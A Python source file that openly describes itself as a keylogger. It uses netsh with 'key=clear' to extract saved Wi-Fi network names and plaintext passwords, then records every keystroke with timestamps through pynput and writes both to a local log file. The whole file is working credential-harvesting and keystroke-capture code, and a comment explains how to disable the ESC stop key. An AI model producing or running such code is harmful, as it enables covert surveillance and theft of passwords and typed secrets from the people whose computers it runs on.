##########################################################################################################################################
##########################################################################################################################################
## This program is a keylogger that takes user's wifi info and keyboard inputs showing the exact time when the user presses any button. ##
##########################################################################################################################################
##########################################################################################################################################

# WIFI INFO SECTION LIBRARIES
import subprocess
import re
import json
# KEYBOARD INPUT SECTION LIBRARIES  
import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime
from datetime import date
import time
import os


#********************************************************************************************************************************
# WIFI INFO
#********************************************************************************************************************************

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

#    We imported the re module to make use of regular expressions. 
#    We want to find all the wifi names which are listed after 
#    "ALL User Profile     :". Using regular expressions we can create 
#    a group of all characters until the return escape sequence (\r) appears.
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

#    We create an empty list outside of the loop where dictionaries 
#    containing all the wifi usernames and passwords will be saved.
wifi_list = []

#    If any profile names are not found this means that wifi connections 
#    have also not been found. So we run this part to check the 
#    details of the wifi and see whether we can get their passwords.
if len(profile_names) != 0:
    for name in profile_names:
        #    Every wifi connection will need its own dictionary which 
        #    will be appended to the variable wifi_list.
        wifi_profile = {}
        #    We can now run a more specific command to see the information 
        #    about the wifi connection and if the Security key
        #    is not absent it may be possible to get the password.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        #    We use the regular expression to only look for the absent cases so we can ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            #    Assign the ssid of the wifi profile to the dictionary.
            wifi_profile["ssid"] = name
            #    These cases aren't absent and we should run the 
            #    "key=clear" command part to get the password.
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            #    Again run the regular expression to capture the 
            #    group after the : (which is the password).
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            #    Check if we found a password using the regular expression. 
            #    Some wifi connections may not have passwords.
            if password == None:
                wifi_profile["password"] = None
            else:
                #    We assign the grouping (where the password is contained) that 
                #    we are interested in to the password key in the dictionary.
                wifi_profile["password"] = password[1]
            #    We append the wifi information to the variable wifi_list.
            wifi_list.append(wifi_profile) 



#**************************************************************************************************************************
# KEYBOARD INPUT
#**************************************************************************************************************************

keys = []

def on_press(key):

    keys.append(key)
    write_file(keys)
    
    try:
        now = datetime.now()
        current_time = now.strftime("%I:%M %p")
        print(current_time)
        print('alphanumeric key {0} pressed'.format(key.char))
         
    except AttributeError:
        print('special key {0} pressed'.format(key))
    
        
    with open('log.txt', 'r') as file:
        lines = file.readlines()
        line_count = len(lines)

    # if (line_count % 15 == 0):  
    #     os.system('cls')


def write_file(keys):
     
    with open('log.txt', 'w') as f:

        # IT BEGINS WRITING WIFI DATA
        f.write("WIFI DATA:\n")
        for x in range(len(wifi_list)):
            json.dump(wifi_list[x], f) 
            f.write("\n\n")

        # CONTINUES WITH WRITING KEYBOARD DATA
        for key in keys:

            #date
            current_date = date.today()
            formatted_date = current_date.strftime('%d-%m-%Y')
            f.write(formatted_date)
            f.write('\t')
            #time         
            now = datetime.now()
            current_time = now.strftime("%I:%M %p")
            f.write(current_time)
            f.write(": ")
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
            f.write('\n')
        
              
def on_release(key):
                     
    print('{0} released'.format(key))

# ****** YOU CAN EASILY STOP THE PROGRAM BY PRESSING 'ESC', IF YOU WANT TO DELETE THAT FEATURE JUST COMMENT THE FOLLOWING 3 LINES. ******
    if key == Key.esc:
        # Stop listener
        return False

  
  
with Listener(on_press = on_press,
              on_release = on_release) as listener:
                     
    listener.join()